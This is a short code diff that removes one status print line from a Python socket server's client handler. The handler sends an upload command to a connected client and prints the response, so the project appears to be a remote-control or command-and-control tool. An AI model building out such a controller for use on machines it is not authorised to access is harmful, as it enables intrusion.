@@ -170,7 +170,6 @@ def handle_client(client_socket, addr):
             print(Fore.RED + "[ * ] Destination path not provided.")
             continue
 
-        print(Fore.YELLOW + f"[ * ] Uploading {file_to_upload} to {destination_path}...")
         client_socket.send(command.encode('utf-8'))  # Send upload command to client
         response = client_socket.recv(4096).decode('utf-8', errors='ignore')
         print(Fore.WHITE + response)
